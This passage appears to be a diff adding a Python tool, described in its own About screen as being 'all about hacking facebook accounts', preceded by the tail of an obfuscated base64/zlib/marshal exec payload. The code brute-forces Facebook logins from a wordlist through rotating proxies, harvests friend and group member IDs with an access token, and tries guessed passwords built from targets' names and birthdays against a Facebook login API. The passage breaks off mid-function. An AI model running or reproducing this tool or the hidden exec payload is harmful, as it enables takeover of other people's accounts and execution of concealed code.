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)\x06\xda\x07marshal\xda\x04zlib\xda\x06base64\xda\x04execZ\ndecompressZ\tb64decode\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x02\x00\x00\x00\x18\x01'))
+'''    ___  ____ ___  ____ ____    ____ ____ ____ ____ ___  ____
+       |__] |___ |__] |__| [__     |__/ |___ |    |  | |  \ |___
+       |__] |___ |__] |  | ___]    |  \ |___ |___ |__| |__/ |___ '''
+#!/bin/usr/python
+from multiprocessing.pool import ThreadPool
+from getpass import getpass
+import uuid, os, urllib.request, sys, json, time, hashlib, random, shutil, re, threading
+import importlib
+try:
+    import mechanize, requests
+    from requests import Session, get, post
+    from mechanize import Browser
+    from bs4 import BeautifulSoup
+except ImportError:
+    os.system('pip install mechanize')
+    os.system('pip install requests')
+    os.system('pip install beautifulsoup4')
+if sys.version[0] == '2':
+    print(green('[INFO]'),(k),'Ini Menggunakan Python3!')
+    sys.exit(1)
+importlib.reload(sys)
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U;id) Presto/2.12.423 Version/12.16')]
+sleep = time.sleep
+h = '\x1b[32m'
+r = '\x1b[1;91m'
+k = '\x1b[1;97m'
+n = '\033[94m'
+W = "\033[0m"
+G = '\033[32;1m'
+R = '\033[31;1m'
+time.sleep(1)
+back = 0
+lol = []
+idd = []
+threads = []
+berhasil = []
+cekpoint = []
+gagal = []
+idb = []
+listgrup = []
+id = []
+ibb = []
+s = ('   Thanks to : Indo'+R+'X'+k+'ploit'+r+' and '+k+'Python Indonesia')
+t = ('                       Token')
+m = ('              Multibruteforce Facebook')
+
+
+
+user_agent_list = [
+   #Chrome
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+    #Firefox
+    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
+    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
+    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
+]
+
+proxies_list = [
+    'http://10.10.1.10:3128',
+    'http://77.232.139.200:8080',
+    'http://78.111.125.146:8080',
+    'http://77.239.133.146:3128',
+    'http://74.116.59.8:53281',
+    'http://67.53.121.67:8080',
+    'http://67.78.143.182:8080',
+    'http://62.64.111.42:53281',
+    'http://62.210.251.74:3128',
+    'http://62.210.105.103:3128',
+    'http://5.189.133.231:80',
+    'http://46.101.78.9:8080',
+    'http://45.55.86.49:8080',
+    'http://40.87.66.157:80',
+    'http://45.55.27.246:8080',
+    'http://45.55.27.246:80',
+    'http://41.164.32.58:8080',
+    'http://45.125.119.62:8080',
+    'http://37.187.116.199:80',
+    'http://43.250.80.226:80',
+    'http://43.241.130.242:8080',
+    'http://38.64.129.242:8080',
+    'http://41.203.183.50:8080',
+    'http://36.85.90.8:8080',
+    'http://36.75.128.3:80',
+    'http://36.81.255.73:8080',
+    'http://36.72.127.182:8080',
+    'http://36.67.230.209:8080',
+    'http://35.198.198.12:8080',
+    'http://35.196.159.241:8080',
+    'http://35.196.159.241:80',
+    'http://27.122.224.183:80',
+    'http://223.206.114.195:8080',
+    'http://221.120.214.174:8080',
+    'http://223.205.121.223:8080',
+    'http://222.124.30.138:80',
+    'http://222.165.205.204:8080',
+    'http://217.61.15.26:80',
+    'http://217.29.28.183:8080',
+    'http://217.121.243.43:8080',
+    'http://213.47.184.186:8080',
+    'http://207.148.17.223:8080',
+    'http://210.213.226.3:8080',
+    'http://202.70.80.233:8080',
+]
+
+sleep(0.2)
+os.system('clear')
+def tik(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(random.random() * 0.1)
+print(k)
+def logo1():
+    os.system('clear')
+    print(R,'   ╔═╗                  ╔═╗╔╗')
+    print(R,'   ║╔╝                  ║╔╝║║')
+    print(R,'  ╔╝╚╗╔══╗╔═╗╔══╗╔══╗  ╔╝╚╗║╚═╗',G,'Author  : 𝙰𝚂𝙼𝙸𝙽')
+    print(R,'  ╚╗╔╝║╔╗║║╔╝║╔═╝║║═╣  ╚╗╔╝║╔╗║',G,'Github  : asmin19',k)
+    print('    ║║ ║╚╝║║║ ║╚═╗║║═╣   ║║ ║╚╝║',G,'Version : 4.0',k)
+    print('    ╚╝ ╚══╝╚╝ ╚══╝╚══╝   ╚╝ ╚══╝  ')
+    print(r+'###################################################'+k)
+def logo():
+    try:
+        bot=open('cookie/login.txt','r').read()
+        links = requests.get("https://graph.facebook.com/me/?access_token="+bot)
+        z = json.loads(links.text)
+        say = z['name']
+    except KeyError:
+        os.system('rm -rf cookie')
+        logo1()
+        print(a)
+        toke()
+    except FileNotFoundError:
+        logo1()
+        print(a)
+        toke()
+    os.system('clear')
+    print(R,'   ╔═╗                  ╔═╗╔╗')
+    print(R,'   ║╔╝                  ║╔╝║║')
+    print(R,'  ╔╝╚╗╔══╗╔═╗╔══╗╔══╗  ╔╝╚╗║╚═╗',G,'Author  : 𝙰𝚂𝙼𝙸𝙽')
+    print(R,'  ╚╗╔╝║╔╗║║╔╝║╔═╝║║═╣  ╚╗╔╝║╔╗║',G,'Github  : asmin19',k)
+    print('    ║║ ║╚╝║║║ ║╚═╗║║═╣   ║║ ║╚╝║',G,'Version : 4.0',k)
+    print('    ╚╝ ╚══╝╚╝ ╚══╝╚══╝   ╚╝ ╚══╝  '+n+say)
+    print(r+'###################################################'+k)
+a = ('===================================================')
+def about():
+    logo()
+    print('')
+    tik(s)
+    print('')
+    print(R+'########################[INFORMATION]###################'+k)
+    print('')
+    print('   Creator                Asmin')
+    print('   About this tools       All about hacking facebook accounts')
+    print('   Version                3.0')
+    print('   Special thanks to     '+G+' Khoirul Amsori'+k+' and'+G+' Ez Nhana Hna'+k)
+    print('   Code name              As'+r+'_'+k+'Min')
+    print('   Team                   Buton '+R+'Sec'+k+'.')
+    print('   E-mail                 asmin987asmin@gmail.com')
+    print('   Github                 asmin19')
+    print('   Telegram               @asmin19')
+    print('   WhatsApp               +62 852-6834-5036')
+    print('   Date                   20:15 13-07-2019')
+    print('   Region                 Baubau,Sulawesi Tenggara, Indonesia')
+    print('   Support Password       xxx123, xxx12345, xxx12, xxx, birthday, \n                          sayang, minions, number, and many more')
+    print('   New Features           You can crack with'+R+' Super-Multibruteforce\n'+k+'                          from friendlist your friends')
+    print(n+"* I'm not hacker, but i'm a beginner programmer ")
+    print('')
+    tik(R+ '* If you find any error or problems, please contact author')
+    print(k)
+    input('[+] Press [Enter] to return ')
+    print('')
+    login()
+def menu():
+    print('''  [ 01 ] Create Wordlist
+  [ 02 ] Bruteforce
+  [ 03 ] Multibruteforce Facebook
+  [ 04 ] Friends Information
+  [ 05 ] Bot Facebook
+  [ 06 ] Yahoo Clone
+  [ 07 ] Token
+  [ 08 ] About
+  [ 09 ] Update
+  [ 00 ] Exit
+  ''')
+    try:
+        asm = input(n+'[#] Asmin'+k+'/' + r+'~' + k + '> ')
+        if asm in ['']:
+            tik(R+'[!] Please enter your choice ')
+            input('[+] Press [Enter] to return ')
+            login()
+        elif asm in ['1','01']:
+            word()
+        elif asm in ['2','02']:
+            brute()
+        elif asm in ['3','03']:
+            mbf()
+        elif asm in ['4','04']:
+            info()
+        elif asm in ['5','05']:
+            mbot()
+        elif asm in ['6','06']:
+            clone()
+        elif asm in ['7','07']:
+            token()
+        elif asm in ['8','08']:
+            about()
+        elif asm in ['9','09']:
+            up()
+        elif asm in ['0','00']:
+            keluar()
+        else:
+            tik(R+'[!] Wrong input')
+            input(n+'[+] Press [Enter] to return ')
+            os.system('clear')
+            logo()
+            print(s)
+            print(a)
+            menu()
+    except EOFError:
+        keluar()
+    except KeyboardInterrupt:
+        keluar()
+def up():
+    os.system('git pull origin master')
+def word():
+    try:
+        os.mkdir('wordlist')
+    except:
+        pass
+    os.system('clear')
+    logo()
+    print('               Create wordlist')
+    print(a)
+    try:
+        tik('[+] Welcome to the simple wordlist making program')
+        print(G+'[warn] Save the file with extension (txt)',k)
+        pas = input('[?] Enter file name: ')
+        wordlist = []
+        tik('[+] press [Enter] 2x, to finish\n[+] Press [Ctrl + d] to abort')
+        while True:
+            lis = input('[?] Input Wordlist: ')
+            if len(lis) >= 1:
+                wordlist.append(lis)
+            else:
+                with open('wordlist/'+pas, 'w') as berkas:
+                    for i in wordlist:
+                        berkas.write(i + '\n')
+                    break
+        tik('[+] Saved : '+h+'wordlist/'+pas)
+        input(n+'[+] Press [Enter] to return '+k)
+        login()
+    except FileNotFoundError:
+        tik('[!] Anda Tidak Menulis Nama file')
+        word()
+    except EOFError:
+        os.system('clear')
+        logo()
+        print(s)
+        print(a)
+        menu()
+def brute():
+    try:
+        logo()
+        print('                   Bruteforce Fb')
+        print(a)
+        URL = 'https://m.facebook.com/login'
+        email = input('[?] Enter the Email or ID target : ')
+        sandi = input('[?] Enter the file wordlist : ')
+        passw = open(sandi, 'r')
+        fuck = passw.readlines()
+        print ('[+] Total : '+str(len(fuck)))
+        print ('[+] Try to crack.....')
+        print(a)
+        san = open(sandi,'r')
+        for password in san:
+            form_data = {'email' : email,
+                        'pass' : password
+                        }
+            user_agent = random.choice(user_agent_list)
+            headers = {'User-Agent': user_agent}
+            proxies_a = random.choice(proxies_list)
+            proxies = {'http': proxies_a}
+            with requests.Session() as c:
+                c.get(URL, headers=headers, proxies=proxies)
+                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+            soup = BeautifulSoup(b.content, 'html.parser')
+            x = soup.find('title')
+            if(str(x) == '<title>Masuk Facebook | Facebook</title>'):
+                print('['+h+'TRY'+k+']'+n, password,end="", flush=True)
+                print ('\r', end="", flush=True)
+            else:
+                print (k+'['+h+'TRY'+k+']'+n, password, end="", flush=True)
+                print (R+'['+h+'LOGIN SUCCESS'+R+']')
+                print (k+'['+h+'PASSWORD'+k+'] '+n+ password)
+                exit()
+        print(k+a)
+        tik(R+'[!] Password not found ')
+        tik(k+'[!] The wordlist is up, please try again using another wordlist')
+        input('[!] Press [Enter] to return ')
+        login()
+    except FileNotFoundError:
+        tik('[×] File not found')
+        input('[+] Press [Enter] to return ')
+        logo()
+        crack()
+    except requests.exceptions.ConnectionError:
+        tik(R+'[!] Check Your Connection')
+        exit()
+    except KeyboardInterrupt:
+        login()
+def mbf():
+    try:
+        os.system('clear')
+        logo()
+        print(m)
+        print(a)
+        print('''  [ 01 ] Dump ID
+  [ 02 ] Dump ID Friends
+  [ 03 ] List Groups
+  [ 04 ] Crack Friends
+  [ 05 ] Crack Group
+  [ 00 ] Back
+  ''')
+        Min = input(n+'[#] Asmin' + k + '/' + n + 'Mbf'+ k + '/' + R + '~' + k + '> ')
+        if Min in['']:
+            tik(R+'[!] Please! enter your choice!')
+            input('[!] Press [Enter] to return ')
+            mbf()
+        elif Min in  ['1','01']:
+            idf()
+        elif Min in ['2','02']:
+            idff()
+        elif Min in ['3','03']:
+            gruplist()
+        elif Min in ['4','04']:
+            simple()
+        elif Min in ['5','05']:
+            crack_grup()
+        elif Min in ['0','00']:
+            os.system('clear')
+            sleep(0.001)
+            logo()
+            print(s)
+            print(a)
+            menu()
+        else:
+            print(R+'[!] Wrong input')
+            input('[!] Press [Enter] to return ')
+            mbf()
+    except EOFError:
+        keluar()
+    except KeyboardInterrupt:
+        keluar()
+def simple():
+    os.system('clear')
+    logo()
+    print(m)
+    print(a)
+    print('''  [ 01 ] Simple
+  [ 02 ] Super
+  [ 03 ] Back
+''')
+    cip = input(n+'[#] Asmin' + k + '/' + n + 'Mbf' + k + '/' + n + 'Friends' + k + '/' + R + '~'+ k + '> ' )
+    if cip in ['']:
+        print(R + '[!] Please! Enter your choice')
+        input('[!] Press [Enter] to return '+k)
+        simple()
+    elif cip in ['1','01']:
+        teman()
+        hasil()
+    elif cip in ['2','02']:
+        lama()
+    elif cip in ['3','03']:
+        mbf()
+    else:
+        print(R+'[!] Wrong input')
+        input('[!] Press [Enter] to return'+k)
+        simple()
+def lama():
+    os.system('clear')
+    logo()
+    print(m)
+    print(a)
+    print('''  [ 01 ] Using ID friends
+  [ 02 ] Crack my friends
+  [ 03 ] back
+  ''')
+    cip = input(n+'[#] Asmin' + k + '/' + n + 'Mbf' + k + '/' + n + 'Friends' + k + '/' + n + 'Super' + k + '/' + R + '~' + k + '> ' )
+    if cip in ['']:
+        print(R+'[!] Please! Enter your choice')
+        input('[!] Press [Enter] to return '+k)
+        lama()
+    elif cip in ['1','01']:
+        ff()
+    elif cip in ['2','02']:
+        tema()
+    elif cip in ['0','00']:
+        simple()
+    else:
+        print(R+'[!] Wrong input')
+        input('[!] Press [Enter] to return'+k)
+        lama()
+def idf():
+        try:
+            os.mkdir('dump')
+        except:
+            pass
+        tik ('[*] Load access token...')
+        sleep(2)
+        try:
+            token = open("cookie/login.txt",'r').read()
+            print ('[*] Token Found')
+        except IOError:
+            print ('[!] Token not found')
+            os.remove('cookie/login.txt')
+            toke()
+        try:
+            r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
+            a = json.loads(r.text)
+            fule  = input("[+] Save file : ")
+            tik('[+] Starting process....')
+            out = open('dump/'+fule,'w')
+            for i in a['data']:
+                idd.append(i['id'])
+                out.write(i['id'] + '\n')
+                print ('Nama : ' + i['name'])
+                print ('ID   : ' + i['id'])
+            out.close()
+            tik('\r[*] Succesfully Getting ID all friends')
+            tik("[*] File Saved  : dump/" + fule)
+            print('[+] Number of IDs ' + str(len(idd)))
+            input('[+] Press [Enter] to return ')
+            mbf()
+        except KeyboardInterrupt:
+            tik('\r[!] Stopped')
+            exit()
+        except KeyError:
+            tik('[!] Failed to getting ID friends')
+            input('[+] Press [Enter] to return ')
+            mbf()
+        except requests.exceptions.ConnectionError:
+            tik(R+'[!] Check Your Connection')
+            exit()
+def hasil():
+    print('')
+    for b in berhasil:
+        print(b)
+    for c in cekpoint:
+        print(c)
+    print
+    print (R+'[×] Failed >> '+k+ str(len(gagal)))
+    print('')
+    a = input('[+] Try again? [y/n] : ')
+    try:
+        if a.lower() == 'n' or a.upper() == 'N':
+            os.system('clear')
+            mbf()
+        elif a.lower() == 'y' or a.upper() == 'Y':
+            os.system('clear')
+            logo()
+            teman()
+            hasil
+        else:
+            print(R+'[!] Wrong input')
+            print('[!] Exiting programs'+k)
+            sleep(2)
+            exit()
+    except ValueError:
+        print(R+'[!] Exiting programs')
+        exit()
+def crack_grup():
+    try:
+        tik ('[*] Load access token...')
+        sleep(2)
+        toket = open("cookie/login.txt",'r').read()
+        print ('[*] Token found')
+    except IOError:
+        tik('[!] Token not found')
+        os.remove('cookie/login.txt')
+        toke()
+    try:
+        idg = input('[?] ID Grup : ')
+        r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
+        aw = json.loads(r.text)
+        print ('[+] Name group : ' + aw['name'])
+    except KeyError:
+        print('[!] Group not found')
+        input('[+] Press [Enter] to return')
+        mbf()
+    except requests.exceptions.ConnectionError:
+       tik(R+'[!] Check your connection')
+       exit()
+    re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
+    s = json.loads(re.text)
+    for i in s['data']:
+        id.append(i['id'])
+    print('[+] Jumlah ID : ' + str(len(id)))
+    tik('[!] Starting Crack...')
+    def main(arg):
+        user = arg
+        try:
+            c = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            b = json.loads(c.text)
+            pass1 = b['first_name'] + '123'
+            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.load(data)
+            if 'access_token' in q:
+                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass1)
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass1)
+                else:
+                    pass2 = b['first_name'] + '12345'
+                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass2)
+                        else:
+                            pass3 = b['last_name'] + '123'
+                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print('['+h+'OK'+k+'] > ' + user + ' | ' + pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print('['+R+'CP'+k+'] > ' + user + ' | ' + pass3)
+                                else:
+                                    lahir = b['birthday']
+                                    pass4 = lahir.replace('/', '')
+                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print('['+h+'OK'+k+'] > ' + user + ' | ' + pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print('['+R+'CP'+k+'] > ' + user + ' | ' + pass4)
+                                        else:
+
